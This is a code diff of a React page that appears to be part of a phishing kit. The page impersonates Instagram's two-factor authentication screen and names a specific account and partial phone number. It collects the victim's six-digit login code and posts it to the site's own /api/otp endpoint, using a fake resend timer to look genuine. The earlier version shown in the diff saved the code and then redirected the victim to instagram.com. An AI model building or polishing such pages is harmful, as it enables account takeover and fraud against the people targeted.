@@ -1,54 +1,83 @@
-import { useState, useEffect } from 'react';
+import { useEffect, useState } from 'react';
 
-export default function OtpPage() {
-  const [otp, setOtp] = useState('');
+export default function OTPPage() {
+  const [seconds, setSeconds] = useState(60);
 
   useEffect(() => {
-    // Preload sound
-    const audio = new Audio('/notify.mp3');
-    audio.load();
+    const timer = setInterval(() => {
+      setSeconds((sec) => {
+        if (sec <= 1) {
+          clearInterval(timer);
+          return 0;
+        }
+        return sec - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
   }, []);
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-
-    const res = await fetch('/api/otp', {
-      method: 'POST',
-      body: new URLSearchParams({ otp }),
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-    });
-
-    if (res.ok) {
-      const audio = new Audio('/notify.mp3');
-      audio.play(); // 🔊 Play sound
-      window.location.href = 'https://www.instagram.com'; // or any other redirect
-    } else {
-      alert('❌ Failed to save OTP');
-    }
-  };
-
   return (
-    <div className="min-h-screen flex items-center justify-center bg-black text-white">
-      <form onSubmit={handleSubmit} className="space-y-4 bg-gray-900 p-6 rounded shadow-lg w-full max-w-md">
-        <h1 className="text-xl font-bold">Enter OTP</h1>
-        <input
-          type="text"
-          name="otp"
-          placeholder="Enter OTP"
-          value={otp}
-          onChange={(e) => setOtp(e.target.value)}
-          className="w-full px-4 py-2 rounded bg-gray-800 border border-gray-700 text-white"
-          required
-        />
-        <button
-          type="submit"
-          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded"
-        >
-          Continue
-        </button>
-      </form>
+    <div style={{
+      backgroundColor: "#000",
+      color: "#fff",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+      minHeight: "100vh", // ✅ Fix added here for full-screen background
+      boxSizing: "border-box"
+    }}>
+      <div style={{ padding: "16px 0 10px", borderBottom: "1px solid #222", textAlign: "center" }}>
+        <img src="/instagram-icon.png" alt="Instagram Icon" style={{ width: "30px", height: "30px", verticalAlign: "middle", marginRight: "8px" }} />
+        <span style={{ fontWeight: 600, fontSize: "16px", verticalAlign: "middle" }}>ruma.rahman7 • Instagram</span>
+      </div>
+
+      <div style={{ padding: "20px" }}>
+        <h2 style={{ fontSize: "20px", textAlign: "center", marginBottom: "8px" }}>Two-Factor Authentication</h2>
+        <p style={{ fontSize: "13px", color: "#aaa", textAlign: "center", marginBottom: "20px" }}>
+          Enter the 6-digit code sent to your phone number ending in ••••30
+        </p>
+        <form method="POST" action="/api/otp">
+          <input
+            type="text"
+            name="otp"
+            placeholder="______"
+            maxLength="6"
+            required
+            style={{
+              width: "100%",
+              padding: "14px 16px",
+              marginBottom: "20px",
+              border: "1px solid #333",
+              borderRadius: "14px",
+              backgroundColor: "#1a1a1a",
+              color: "#fff",
+              fontSize: "18px",
+              textAlign: "center",
+              letterSpacing: "6px",
+              boxShadow: "inset 0 1px 2px rgba(0, 0, 0, 0.4)",
+              boxSizing: "border-box"
+            }}
+          />
+          <div style={{ textAlign: "center", fontSize: "14px", color: "#888", marginBottom: "20px" }}>
+            Resend OTP in <span>{seconds}</span>s
+          </div>
+          <button
+            type="submit"
+            style={{
+              width: "100%",
+              padding: "14px",
+              backgroundColor: "#3897f0",
+              color: "#fff",
+              border: "none",
+              borderRadius: "14px",
+              fontSize: "15px",
+              fontWeight: "bold",
+              cursor: "pointer"
+            }}
+          >
+            Continue
+          </button>
+        </form>
+      </div>
     </div>
   );
 }
